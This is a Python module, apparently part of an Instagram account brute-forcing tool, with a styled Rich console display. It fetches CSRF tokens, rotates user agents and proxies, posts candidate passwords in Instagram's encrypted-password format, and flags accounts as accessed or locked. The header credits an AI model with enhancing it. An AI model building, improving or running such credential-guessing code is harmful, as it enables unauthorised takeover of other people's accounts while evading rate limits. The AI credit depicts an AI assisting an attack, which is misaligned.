# Filename: browser_rich.py
# Author: Mohamed (Enhanced by GPT-5)
# Description: Hacker-Style Browser Visualization with Rich

from time import time
from random import choice
from datetime import datetime
import typing
import requests

from requests_html import HTMLSession
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.text import Text
from rich.style import Style

from .const import browser_data, response_codes, fetch_time, user_agents, debug
from lib import proxy


console = Console(theme=None, style="green")


class Browser:
    account_exists = None

    def __init__(self, username, password, proxy: proxy.Proxy):
        self.proxy = proxy
        self.username = username
        self.password = password
        self.start_time = None
        self.is_found = False
        self.is_active = True
        self.is_locked = False
        self.is_attempted = False
        self.__browser = None

    @property
    def browser(self):
        if self.__browser is None:
            header = browser_data["header"]
            header["user-agent"] = choice(user_agents)

            session = HTMLSession()
            session.headers.update(header)
            session.proxies.update(self.proxy.addr)
            session.trust_env = False

            self.__browser = session
        return self.__browser

    def display_status(self, title, message, style="green"):
        panel = Panel(
            Text(message, style=style, justify="center"),
            title=f"[bold]{title}[/bold]",
            border_style=style,
            expand=False,
        )
        console.print(panel)

    def get_token(self):
        try:
            self.display_status("TOKEN", "Fetching CSRF token...", "bright_green")
            r = self.browser.get(browser_data["home_url"], timeout=fetch_time)
            token = r.cookies.get_dict().get("csrftoken")
            if token:
                console.print(f"[green]✔ Token retrieved successfully.[/green]")
            else:
                console.print(f"[red]✖ Failed to get token[/red]")
            return token
        except Exception:
            console.print("[red]⚠ Token request failed[/red]")

    def post_data(self):
        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{self.password}"
        data = {
            browser_data["username_field"]: self.username,
            browser_data["password_field"]: enc_password,
        }

        try:
            self.display_status("LOGIN", f"Sending credentials for [bold]{self.username}[/bold]...", "cyan")
            resp = self.browser.post(
                browser_data["login_url"],
                data=data,
                timeout=fetch_time,
            ).json()
            self.proxy.incr_success()
            console.print(f"[green]✔ Login response received[/green]")
            return resp
        except Exception:
            console.print("[red]✖ Login request failed[/red]")

    def check_exists(self, response):
        if "user" in response:
            Browser.account_exists = response["user"]

    def check_response(self, response):
        if "authenticated" in response:
            if response["authenticated"]:
                return response_codes["succeed"]

        if "message" in response:
            if response.get("checkpoint_url", None):
                return response_codes["succeed"]

            if response["status"] == "fail":
                return response_codes["locked"]

        if "errors" in response:
            return response_codes["locked"]

        return response_codes["failed"]

    def get_ip(self) -> typing.Optional[str]:
        url = "https://api.ipify.org/"
        try:
            r = self.browser.get(url, timeout=fetch_time)
            return r.text
        except Exception:
            return None

    def authenicate(self):
        with Progress(SpinnerColumn(), TextColumn("[bold green]Authenticating...[/bold green]")) as progress:
            task = progress.add_task("auth", total=None)
            response = self.post_data()
            progress.stop()

        resp = {"attempted": False, "accessed": False, "locked": False}

        if debug:
            ip = self.get_ip()
            console.print(f"[yellow]IP:[/yellow] {ip or 'N/A'}")
            console.print(f"[dim]Response:[/dim] {response}")

        if response is not None:
            resp["attempted"] = True
            resp_code = self.check_response(response)

            if resp_code == response_codes["locked"]:
                resp["locked"] = True

            if resp_code == response_codes["succeed"]:
                resp["accessed"] = True

            if Browser.account_exists is None:
                self.check_exists(response)

        return resp

    def attempt(self):
        self.start_time = time()
        console.rule(f"[bold green]START ATTEMPT → {self.username}[/bold green]")
        token = self.get_token()

        if token:
            self.browser.headers.update({"x-csrftoken": token})
            resp = self.authenicate()

            table = Table(title=f"Attempt Report for {self.username}", style="green", border_style="bright_green")
            table.add_column("Parameter", style="cyan", justify="left")
            table.add_column("Result", style="bright_white", justify="center")

            table.add_row("Attempted", str(resp["attempted"]))
            table.add_row("Accessed", str(resp["accessed"]))
            table.add_row("Locked", str(resp["locked"]))
            table.add_row("Proxy", str(self.proxy.addr))
            table.add_row("Time", f"{round(time() - self.start_time, 2)}s")

            console.print(table)

            if resp["attempted"]:
                self.is_attempted = True
                if not resp["locked"]:
                    if resp["accessed"]:
                        self.is_found = True
                        self.display_status("SUCCESS", f"✅ Account found: {self.username}", "green")
                else:
                    self.is_locked = True
                    self.display_status("LOCKED", "⚠ Account temporarily locked", "red")
        else:
            self.display_status("ERROR", "Failed to fetch CSRF token", "red")

        self.close()

    def close(self):
        self.browser.close()
        self.is_active = False
        console.print("[dim]Browser session closed.[/dim]\n")
